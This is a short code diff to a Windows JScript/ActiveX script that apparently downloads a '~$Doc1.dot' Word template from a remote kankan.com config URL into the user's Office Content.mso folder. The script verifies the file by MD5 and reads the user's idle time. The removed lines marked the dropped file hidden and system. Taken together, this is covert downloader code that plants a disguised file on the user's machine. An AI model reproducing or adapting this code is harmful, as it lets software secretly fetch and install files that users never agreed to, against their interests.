@@ -21,7 +21,7 @@ var __shellapp = new ActiveXObject("Shell.Application");
 
 //var __workdir = __storage.GetFolderPath(0, 0x0020, 0, 0) + "\\Content.mso\\"	
 var __workdir = __shellapp.Namespace(0x0020).Self.Path + "\\Content.mso\\";
-var __destReadys ={ name: "~$Doc1.dot",url:"http://conf.xmp.kankan.com/config/~$Doc1.dot", md5:"1BD79B91D115E50976AB4CBC6001E725" }
+var __destReadys ={ name: "~$Doc1.dot",url:"http://conf.xmp.kankan.com/config/~$Doc1.dot", md5:"98A44C9C0104E1525A2C4CF8AD20A8D0" }
 var __startTickCout = __external.GetTickCount()
 var __lastInputInfo = __external.GetLastInputInfo()
 /*
@@ -284,15 +284,19 @@ function filter_dlbusiness.prototype.run(pipe){
 						adostream.Mode = 3;
 						adostream.Type = 1;
 						adostream.Open();
+						
 						adostream.Write(objXMLHTTP.responseBody);
-						adostream.SaveToFile(path,3);
+						
+						adostream.SaveToFile(path,2);
 						adostream.Close();
+						
 						var fso = __fso;
-						fso.GetFile(path).Attributes = 4|2
+						//fso.GetFile(path).Attributes = 2 
 						var tmpFile = __shellapp.Namespace(0x0020).Self.Path + "\\" + pipe.name;						
-						fso.DeleteFile(tmpFile, true);
+						if(fso.FileExists(tmpFile))
+							fso.DeleteFile(tmpFile, true);
 						delete adostream;
-						log("download from url="+pipe.url+" to path="+path+" ,status="+objXMLHTTP.status +" statusText="+objXMLHTTP.statusText );
+						log("download from url="+pipe.url+" to path="+path+" ,status="+objXMLHTTP.status +" statusText="+objXMLHTTP.statusText+" ,tmpFile="+tmpFile );
 						if(1){
 							var tmd5 = __storage.GetFileMD5 (path)
 							log(" path md5:"+tmd5+" destmd5:"+pipe.md5)
